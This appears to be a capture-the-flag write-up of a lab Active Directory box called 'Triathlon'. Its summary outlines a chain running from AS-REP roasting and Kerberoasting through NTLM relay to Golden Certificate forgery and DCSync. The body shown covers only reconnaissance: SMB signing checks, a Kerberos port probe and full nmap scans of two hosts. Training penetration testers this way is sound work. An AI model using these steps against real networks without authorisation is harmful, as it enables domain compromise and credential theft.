---
title: HackSmarter - Triathlon
date: 2026-07-02
image: cover.png
tags: [HackSmarter, Hard, Windows, Active Directory]
excerpt: A hard three-host Active Directory box that builds a user list from real-world OSINT, chains AS-REP Roasting and Kerberoasting without pre-authentication for a foothold, relays a coerced NTLM hash across servers lacking SMB signing, cracks a cached domain credential, and forges a Golden Certificate from the compromised CA to DCSync the krbtgt hash.
---

# Triathlon

### Objective & Scope

The 2025 U.S. Elite Triathlon National Team has requested a penetration test on its internal network. They have granted access to their network via VPN, but no other information has been provided. Successful testers should prove full compromise by providing the NTLM hash for the "krbtgt" account.

### Infrastructure Architecture

{% image %}

### SMB - Hosts Enumeration

{% image2 %}

The `netexec` scan shows that only `RUN-SRV` enforces SMB signing, while the other two hosts have it disabled. This points to `RUN-SRV` being the domain controller, since domain controllers enforce SMB signing by default, and marks the other two as member servers. Confirming the assumption with `nc -vn ${IP} 88` to check whether the Kerberos port is open:

{% image3 %}

The open Kerberos port confirms that `RUN-SRV` is the domain controller.

### NMAP Scanning - RUN-SRV

```python
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-02 08:01:38Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: tri.lab0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=RUN-SRV.tri.lab
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:RUN-SRV.tri.lab
| Issuer: commonName=tri-CA/domainComponent=tri
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-03T22:41:24
| Not valid after:  2026-10-03T22:41:24
| MD5:   9289:cf22:8991:0cc3:bc3e:0fb1:9e74:9c58
| SHA-1: e4fb:5962:0ee8:16e4:2a3c:2469:d22c:1ace:168e:e138
| -----BEGIN CERTIFICATE-----
| MIIGCjCCBPKgAwIBAgITKwAAAAL2EP8O5xRgGAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADA7MRMwEQYKCZImiZPyLGQBGRYDbGFiMRMwEQYKCZImiZPyLGQBGRYDdHJpMQ8w
| DQYDVQQDEwZ0cmktQ0EwHhcNMjUxMDAzMjI0MTI0WhcNMjYxMDAzMjI0MTI0WjAa
| MRgwFgYDVQQDEw9SVU4tU1JWLnRyaS5sYWIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQC7FIlUzq52Yn/8L9P//DD6GkxWTA+t+erT1hfhEEuEgvSz47yx
| WNKU5e4Dt3v2Ddb9NDcivZIAgWD7OIL/ZnbKCtRhYudNPF5n7CGi58fWhc84pIVL
| SxlquUuLwNa5hLe4zQpByZ22JGNbp/GqtqAQfwDvjmm6U7KEiNMRDy9hWiRifOtp
| kfY0J7HdQzFiFI9dHujDeBmNA3FKyGC/2/oiM51lkvTgHuLtTy+oAV/knJVW3vtg
| qxbOzZVN9M3njZzyhJZriMlK4+MqrbuVo/5P2chf+1Se2cVhYFY+fbPKSLY9ZYRf
| vTDwF3u+JDEEl6JQRyzIKqj3eDsPIzy/+pC9AgMBAAGjggMmMIIDIjAvBgkrBgEE
| AYI3FAIEIh4gAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0l
| BBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG
| 9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZI
| AWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcG
| BSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBQAA+mkgaqR5njjO+GffuLNxCU7
| +jAfBgNVHSMEGDAWgBTnZNUtxzwpAMQT+zkT8x4jaOZB8jCBwQYDVR0fBIG5MIG2
| MIGzoIGwoIGthoGqbGRhcDovLy9DTj10cmktQ0EsQ049U1dJTS1TUlYsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dHJpLERDPWxhYj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbQGCCsGAQUF
| BwEBBIGnMIGkMIGhBggrBgEFBQcwAoaBlGxkYXA6Ly8vQ049dHJpLUNBLENOPUFJ
| QSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25m
| aWd1cmF0aW9uLERDPXRyaSxEQz1sYWI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVj
| dENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOwYDVR0RBDQwMqAfBgkrBgEE
| AYI3GQGgEgQQZEriRZZHoEqmJ7APriKesIIPUlVOLVNSVi50cmkubGFiME4GCSsG
| AQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS01NDI3OTcyMDUt
| Mzk1MjA1Mjc2Ni0xMTc1MTg3MjAwLTEwMDAwDQYJKoZIhvcNAQELBQADggEBAH5m
| o4pAhCrdqG5ncR/epLOmaC9oCWT1kB09zv5u/60UC0Ak2N+zUIT2i1pTdAcEtJjn
| +A+Lw/O1wo3DC9/T2eWHGtIzJ1VP2ldqYPYT1zAyI2YZ1Yqp30naTGgvEH1dBeR6
| 71WAmljnMH4wRu3+xJAYWmfHNI9sLvloG0EiFuI85Vgq7rGELBxhusvFe/xBitkB
| 9u3T5GMU25wngguDjPvsrzuo804+6WXXO1eESiEIxqgGISqh5gFUBHbdKlCML0t0
| cbvEeNFBoIKLaI6ggFkz5G0ihU5s8t2pk8j8BRQgM/Ux7DuUcQixrSG+fQXVXPCY
| RS3Rkndjll4K9deh6Dw=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: tri.lab0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=RUN-SRV.tri.lab
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:RUN-SRV.tri.lab
| Issuer: commonName=tri-CA/domainComponent=tri
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-03T22:41:24
| Not valid after:  2026-10-03T22:41:24
| MD5:   9289:cf22:8991:0cc3:bc3e:0fb1:9e74:9c58
| SHA-1: e4fb:5962:0ee8:16e4:2a3c:2469:d22c:1ace:168e:e138
| -----BEGIN CERTIFICATE-----
| MIIGCjCCBPKgAwIBAgITKwAAAAL2EP8O5xRgGAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADA7MRMwEQYKCZImiZPyLGQBGRYDbGFiMRMwEQYKCZImiZPyLGQBGRYDdHJpMQ8w
| DQYDVQQDEwZ0cmktQ0EwHhcNMjUxMDAzMjI0MTI0WhcNMjYxMDAzMjI0MTI0WjAa
| MRgwFgYDVQQDEw9SVU4tU1JWLnRyaS5sYWIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQC7FIlUzq52Yn/8L9P//DD6GkxWTA+t+erT1hfhEEuEgvSz47yx
| WNKU5e4Dt3v2Ddb9NDcivZIAgWD7OIL/ZnbKCtRhYudNPF5n7CGi58fWhc84pIVL
| SxlquUuLwNa5hLe4zQpByZ22JGNbp/GqtqAQfwDvjmm6U7KEiNMRDy9hWiRifOtp
| kfY0J7HdQzFiFI9dHujDeBmNA3FKyGC/2/oiM51lkvTgHuLtTy+oAV/knJVW3vtg
| qxbOzZVN9M3njZzyhJZriMlK4+MqrbuVo/5P2chf+1Se2cVhYFY+fbPKSLY9ZYRf
| vTDwF3u+JDEEl6JQRyzIKqj3eDsPIzy/+pC9AgMBAAGjggMmMIIDIjAvBgkrBgEE
| AYI3FAIEIh4gAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0l
| BBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG
| 9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZI
| AWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcG
| BSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBQAA+mkgaqR5njjO+GffuLNxCU7
| +jAfBgNVHSMEGDAWgBTnZNUtxzwpAMQT+zkT8x4jaOZB8jCBwQYDVR0fBIG5MIG2
| MIGzoIGwoIGthoGqbGRhcDovLy9DTj10cmktQ0EsQ049U1dJTS1TUlYsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dHJpLERDPWxhYj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbQGCCsGAQUF
| BwEBBIGnMIGkMIGhBggrBgEFBQcwAoaBlGxkYXA6Ly8vQ049dHJpLUNBLENOPUFJ
| QSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25m
| aWd1cmF0aW9uLERDPXRyaSxEQz1sYWI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVj
| dENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOwYDVR0RBDQwMqAfBgkrBgEE
| AYI3GQGgEgQQZEriRZZHoEqmJ7APriKesIIPUlVOLVNSVi50cmkubGFiME4GCSsG
| AQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS01NDI3OTcyMDUt
| Mzk1MjA1Mjc2Ni0xMTc1MTg3MjAwLTEwMDAwDQYJKoZIhvcNAQELBQADggEBAH5m
| o4pAhCrdqG5ncR/epLOmaC9oCWT1kB09zv5u/60UC0Ak2N+zUIT2i1pTdAcEtJjn
| +A+Lw/O1wo3DC9/T2eWHGtIzJ1VP2ldqYPYT1zAyI2YZ1Yqp30naTGgvEH1dBeR6
| 71WAmljnMH4wRu3+xJAYWmfHNI9sLvloG0EiFuI85Vgq7rGELBxhusvFe/xBitkB
| 9u3T5GMU25wngguDjPvsrzuo804+6WXXO1eESiEIxqgGISqh5gFUBHbdKlCML0t0
| cbvEeNFBoIKLaI6ggFkz5G0ihU5s8t2pk8j8BRQgM/Ux7DuUcQixrSG+fQXVXPCY
| RS3Rkndjll4K9deh6Dw=
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: tri.lab0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=RUN-SRV.tri.lab
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:RUN-SRV.tri.lab
| Issuer: commonName=tri-CA/domainComponent=tri
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-03T22:41:24
| Not valid after:  2026-10-03T22:41:24
| MD5:   9289:cf22:8991:0cc3:bc3e:0fb1:9e74:9c58
| SHA-1: e4fb:5962:0ee8:16e4:2a3c:2469:d22c:1ace:168e:e138
| -----BEGIN CERTIFICATE-----
| MIIGCjCCBPKgAwIBAgITKwAAAAL2EP8O5xRgGAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADA7MRMwEQYKCZImiZPyLGQBGRYDbGFiMRMwEQYKCZImiZPyLGQBGRYDdHJpMQ8w
| DQYDVQQDEwZ0cmktQ0EwHhcNMjUxMDAzMjI0MTI0WhcNMjYxMDAzMjI0MTI0WjAa
| MRgwFgYDVQQDEw9SVU4tU1JWLnRyaS5sYWIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQC7FIlUzq52Yn/8L9P//DD6GkxWTA+t+erT1hfhEEuEgvSz47yx
| WNKU5e4Dt3v2Ddb9NDcivZIAgWD7OIL/ZnbKCtRhYudNPF5n7CGi58fWhc84pIVL
| SxlquUuLwNa5hLe4zQpByZ22JGNbp/GqtqAQfwDvjmm6U7KEiNMRDy9hWiRifOtp
| kfY0J7HdQzFiFI9dHujDeBmNA3FKyGC/2/oiM51lkvTgHuLtTy+oAV/knJVW3vtg
| qxbOzZVN9M3njZzyhJZriMlK4+MqrbuVo/5P2chf+1Se2cVhYFY+fbPKSLY9ZYRf
| vTDwF3u+JDEEl6JQRyzIKqj3eDsPIzy/+pC9AgMBAAGjggMmMIIDIjAvBgkrBgEE
| AYI3FAIEIh4gAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0l
| BBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG
| 9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZI
| AWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcG
| BSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBQAA+mkgaqR5njjO+GffuLNxCU7
| +jAfBgNVHSMEGDAWgBTnZNUtxzwpAMQT+zkT8x4jaOZB8jCBwQYDVR0fBIG5MIG2
| MIGzoIGwoIGthoGqbGRhcDovLy9DTj10cmktQ0EsQ049U1dJTS1TUlYsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dHJpLERDPWxhYj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbQGCCsGAQUF
| BwEBBIGnMIGkMIGhBggrBgEFBQcwAoaBlGxkYXA6Ly8vQ049dHJpLUNBLENOPUFJ
| QSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25m
| aWd1cmF0aW9uLERDPXRyaSxEQz1sYWI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVj
| dENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOwYDVR0RBDQwMqAfBgkrBgEE
| AYI3GQGgEgQQZEriRZZHoEqmJ7APriKesIIPUlVOLVNSVi50cmkubGFiME4GCSsG
| AQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS01NDI3OTcyMDUt
| Mzk1MjA1Mjc2Ni0xMTc1MTg3MjAwLTEwMDAwDQYJKoZIhvcNAQELBQADggEBAH5m
| o4pAhCrdqG5ncR/epLOmaC9oCWT1kB09zv5u/60UC0Ak2N+zUIT2i1pTdAcEtJjn
| +A+Lw/O1wo3DC9/T2eWHGtIzJ1VP2ldqYPYT1zAyI2YZ1Yqp30naTGgvEH1dBeR6
| 71WAmljnMH4wRu3+xJAYWmfHNI9sLvloG0EiFuI85Vgq7rGELBxhusvFe/xBitkB
| 9u3T5GMU25wngguDjPvsrzuo804+6WXXO1eESiEIxqgGISqh5gFUBHbdKlCML0t0
| cbvEeNFBoIKLaI6ggFkz5G0ihU5s8t2pk8j8BRQgM/Ux7DuUcQixrSG+fQXVXPCY
| RS3Rkndjll4K9deh6Dw=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: tri.lab0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=RUN-SRV.tri.lab
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:RUN-SRV.tri.lab
| Issuer: commonName=tri-CA/domainComponent=tri
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-03T22:41:24
| Not valid after:  2026-10-03T22:41:24
| MD5:   9289:cf22:8991:0cc3:bc3e:0fb1:9e74:9c58
| SHA-1: e4fb:5962:0ee8:16e4:2a3c:2469:d22c:1ace:168e:e138
| -----BEGIN CERTIFICATE-----
| MIIGCjCCBPKgAwIBAgITKwAAAAL2EP8O5xRgGAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADA7MRMwEQYKCZImiZPyLGQBGRYDbGFiMRMwEQYKCZImiZPyLGQBGRYDdHJpMQ8w
| DQYDVQQDEwZ0cmktQ0EwHhcNMjUxMDAzMjI0MTI0WhcNMjYxMDAzMjI0MTI0WjAa
| MRgwFgYDVQQDEw9SVU4tU1JWLnRyaS5sYWIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQC7FIlUzq52Yn/8L9P//DD6GkxWTA+t+erT1hfhEEuEgvSz47yx
| WNKU5e4Dt3v2Ddb9NDcivZIAgWD7OIL/ZnbKCtRhYudNPF5n7CGi58fWhc84pIVL
| SxlquUuLwNa5hLe4zQpByZ22JGNbp/GqtqAQfwDvjmm6U7KEiNMRDy9hWiRifOtp
| kfY0J7HdQzFiFI9dHujDeBmNA3FKyGC/2/oiM51lkvTgHuLtTy+oAV/knJVW3vtg
| qxbOzZVN9M3njZzyhJZriMlK4+MqrbuVo/5P2chf+1Se2cVhYFY+fbPKSLY9ZYRf
| vTDwF3u+JDEEl6JQRyzIKqj3eDsPIzy/+pC9AgMBAAGjggMmMIIDIjAvBgkrBgEE
| AYI3FAIEIh4gAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0l
| BBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG
| 9w0BCQ8EazBpMA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZI
| AWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcG
| BSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBQAA+mkgaqR5njjO+GffuLNxCU7
| +jAfBgNVHSMEGDAWgBTnZNUtxzwpAMQT+zkT8x4jaOZB8jCBwQYDVR0fBIG5MIG2
| MIGzoIGwoIGthoGqbGRhcDovLy9DTj10cmktQ0EsQ049U1dJTS1TUlYsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dHJpLERDPWxhYj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbQGCCsGAQUF
| BwEBBIGnMIGkMIGhBggrBgEFBQcwAoaBlGxkYXA6Ly8vQ049dHJpLUNBLENOPUFJ
| QSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25m
| aWd1cmF0aW9uLERDPXRyaSxEQz1sYWI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVj
| dENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOwYDVR0RBDQwMqAfBgkrBgEE
| AYI3GQGgEgQQZEriRZZHoEqmJ7APriKesIIPUlVOLVNSVi50cmkubGFiME4GCSsG
| AQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS01NDI3OTcyMDUt
| Mzk1MjA1Mjc2Ni0xMTc1MTg3MjAwLTEwMDAwDQYJKoZIhvcNAQELBQADggEBAH5m
| o4pAhCrdqG5ncR/epLOmaC9oCWT1kB09zv5u/60UC0Ak2N+zUIT2i1pTdAcEtJjn
| +A+Lw/O1wo3DC9/T2eWHGtIzJ1VP2ldqYPYT1zAyI2YZ1Yqp30naTGgvEH1dBeR6
| 71WAmljnMH4wRu3+xJAYWmfHNI9sLvloG0EiFuI85Vgq7rGELBxhusvFe/xBitkB
| 9u3T5GMU25wngguDjPvsrzuo804+6WXXO1eESiEIxqgGISqh5gFUBHbdKlCML0t0
| cbvEeNFBoIKLaI6ggFkz5G0ihU5s8t2pk8j8BRQgM/Ux7DuUcQixrSG+fQXVXPCY
| RS3Rkndjll4K9deh6Dw=
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-07-02T08:03:08+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=RUN-SRV.tri.lab
| Issuer: commonName=RUN-SRV.tri.lab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-01T07:52:21
| Not valid after:  2026-12-31T07:52:21
| MD5:   56b1:f061:e0f4:e031:94b2:32bc:5c2f:f12c
| SHA-1: fa77:29f8:1ff9:9f4f:d074:c8b9:2d1c:18d8:0501:4f63
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQcSXtMv2HdoZLNM8xgJwsZTANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9SVU4tU1JWLnRyaS5sYWIwHhcNMjYwNzAxMDc1MjIxWhcNMjYx
| MjMxMDc1MjIxWjAaMRgwFgYDVQQDEw9SVU4tU1JWLnRyaS5sYWIwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC5AiwujWr2FHNf5ofA5aYfbGeiZjOzJnys
| 8u6VPJvR/G8aIy8k9zZyjNOUFY+JTqeMpkY9pD86d6xZRrtwoYj++XW5Txb9bDLs
| fT1758ROCGhjhoYk2asovUejFnpMnfW6i+cz6CaejHTIdA6haYVE19BZJiGVpLOe
| rv8A/O8N3OzMR+zuzZMO+HdphfWksF0sVvn7hWOOYjESJK5UCdNf+cQ7OMKV8t6y
| gD1n09cHnEHU3Wvrbe7RMqRCc7wIH8lU7Sk6sPKNqyXPGhxXfrR094Eh/fEfYOPJ
| K1qUyu6r7/lc7Y94znBF7qt7hJu4PFsekT8IG3aConO0ZXRpTcVtAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEARblbvMo7KxU5LpP3jakoB8gqjRBV80wBsIv6NQ57qCqADt7kxn2jyndP
| bO5fDYfBEkynq983k6l6XDMyRw3Frzyxl4CWc4pdQv2pkSkYSBvDx7HDyWmylXJG
| b0IwUPJWs9aZ4IdyVpdWHniwkt3k7TsTeFPqM8s/k71aFQ89Cv2vq0tjJwwMeVsw
| iQuwvFVn0QJqwiPCVgmWJV6ZGx9bsZ2Q7xCQdOczx1imb83lpuyaEB48tCAIa/lm
| /231ZPRgL9JiZ3+87aKg8negDX8kgM11lhlGLwU/aTR2b1vw2ZRn/Jn0oA8l162a
| DqCI6vZkHErazKy/zLJfat4q0tOcAA==
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: TRI
|   NetBIOS_Domain_Name: TRI
|   NetBIOS_Computer_Name: RUN-SRV
|   DNS_Domain_Name: tri.lab
|   DNS_Computer_Name: RUN-SRV.tri.lab
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-02T08:02:29+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49482/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49484/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49496/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49510/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49525/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: RUN-SRV; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-02T08:02:32
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 29529/tcp): CLEAN (Timeout)
|   Check 2 (port 29428/tcp): CLEAN (Timeout)
|   Check 3 (port 56942/udp): CLEAN (Timeout)
|   Check 4 (port 16436/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

### NMAP Scanning - SWIM-SRV

```python
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
445/tcp   open  microsoft-ds? syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-07-02T08:03:30+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SWIM-SRV.tri.lab
| Issuer: commonName=SWIM-SRV.tri.lab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-01T07:52:07
| Not valid after:  2026-12-31T07:52:07
| MD5:   29eb:5bab:024c:3be7:f08e:5680:bc69:a0c5
| SHA-1: 4260:14c0:5b35:a785:594a:e1d8:23d0:13c6:bf4d:7202
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQHhhtgDcL1oVFxApre0BxGzANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBTV0lNLVNSVi50cmkubGFiMB4XDTI2MDcwMTA3NTIwN1oXDTI2
| MTIzMTA3NTIwN1owGzEZMBcGA1UEAxMQU1dJTS1TUlYudHJpLmxhYjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK6JB/wlqBkEqGxZiTYCf4SDcAg51uMd
| Yf0FihizA4+927NtDxslBYaaJYBqZ1FvDuC5EwLzu2Ec9x9C0lvMBvNKJ2rQmIsk
| qreG8T1yYMnM2IHPmnen/7BgQNXV9KA3rSaFp/Y3WfdiTuhQcmj5lT/wOIw/ICGn
| au0NnwPubh3yaGInnmzSlRXcHFCl4NilwNOmp/eOVXim7+JRMjwA5EWIvELjW8yt
| QMxAODSFIw+CIXjImaK116O6PTz6FS5H0P20nHH0oBxLCHvfR8/MytA2W48fi3r8
| yb5zpVZ6Vki1lPYw5olYrzhWsY94gpv15Wu16SWs/5W4scart1zWSbECAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQCG3HrRCKrujR2G+bYvZwCtAXvMS/ygntb/KggWDPVPEFBviirhwmwy
| n6k+SARnd+tIy2H/C3C156NQzFmkXrVjzqvC6KnHgpn1tWpkWm5tJVUkFwniYeFj
| sD4Lkg+sS+UQWgCr8D9vq/w2qz9ydAPKQTdQEG83N0ugd+LuLKMYV29fRfNWrA9A
| CPhOQ0q4fJPn5Uk+vtsd4YvVJ4Jnxj55+qWo2VNeLPXLlTb5uLS/aIRVo+XjPjRz
| tPjRshf8usFqM8N6RW+8DecQH4bOJVAiV4tGQhwbOyG9Ve/uoHzd6vhnDzskIMNJ
| WO8lwgO8vC+9qiRlT27vQoFJcvsAO2Vg
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: TRI
|   NetBIOS_Domain_Name: TRI
|   NetBIOS_Computer_Name: SWIM-SRV
|   DNS_Domain_Name: tri.lab
|   DNS_Computer_Name: SWIM-SRV.tri.lab
|   DNS_Tree_Name: tri.lab
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-02T08:02:50+00:00
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49684/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-02T08:02:52
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 64526/tcp): CLEAN (Timeout)
|   Check 2 (port 28048/tcp): CLEAN (Timeout)
|   Check 3 (port 32058/udp): CLEAN (Timeout)
|   Check 4 (port 44870/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

